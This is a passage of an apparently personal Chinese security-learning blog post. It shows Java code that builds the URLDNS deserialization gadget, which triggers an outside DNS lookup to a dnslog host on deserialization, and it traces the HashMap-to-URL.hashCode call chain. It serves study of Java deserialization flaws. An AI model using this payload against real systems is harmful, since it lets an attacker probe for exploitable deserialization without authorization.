+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.URLDNSTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址，这里使用的是dnslog</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://ch16ri.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>);</span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">&quot;m1yuu&quot;</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/03/03/hqtAv9LgE7lseFD.png"></p>
+<h4 id="About-HashMap"><a href="#About-HashMap" class="headerlink" title="About HashMap"></a>About <strong>HashMap</strong></h4><blockquote>
+<p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。</p>
+<p>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。</p>
+<p>HashMap 是无序的，即不会记录插入的顺序。</p>
+<p>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p>
+</blockquote>
+<p><img src="https://www.runoob.com/wp-content/uploads/2020/07/WV9wXLl.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-hashmap.html">https://www.runoob.com/java/java-hashmap.html</a></p>
+<h4 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h4><p><code>java.util.HashMap#writeObject</code>分为三个步骤进行序列化：</p>
+<blockquote>
+<p>1.序列化写入一维数组的长度（不是特别确定，但是这个值在反序列化中是不使用的，所以不太重要）</p>
+<p>2.序列化写入键值对的个数</p>
+<p>3.序列化写入键值对的键和值；</p>
+</blockquote>
+<p>在HashMap.java中可以看到HashMap类拓展了序列化的接口。我们定位到readObject的位置，在putval方法的位置下断点</p>
+<p><code>putVal</code>是往HashMap中放入键值对的方法</p>
+<p><img src="https://s2.loli.net/2022/03/06/D1vh6FBE3uCpMX2.png" alt="image-20220306193549799"></p>
+<p>跟进，看到hash函数方法传入的key是我们目标url对象</p>
+<p><img src="https://s2.loli.net/2022/03/06/YShNqQI5AdPZJvO.png" alt="image-20220306193754384"></p>
+<p>继续跟进，跟到hashCode()方法，可以看到下面进行了<code>InetAddress addr = getHostAddress(u);</code>，成功触发。所以调用路线即为</p>
+<blockquote>
+<p>HashMap-&gt;readObject()-&gt;hash()-&gt;URL.class-&gt;hashcode()-&gt;UrlStreamHandler.class-&gt;hashcode()-&gt;InetAddress addr &#x3D; getHostAddress(u);</p>
+</blockquote>
+<p>所以我们要执行的是的是URL查询的方法<code>URL-&gt;hashCode()</code>。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/03/07/java_web/" data-id="cl0fhuzfd00009dr9gih1ggk0" data-title="java_web学习之路" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/03/07/java_web/">java_web学习之路</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
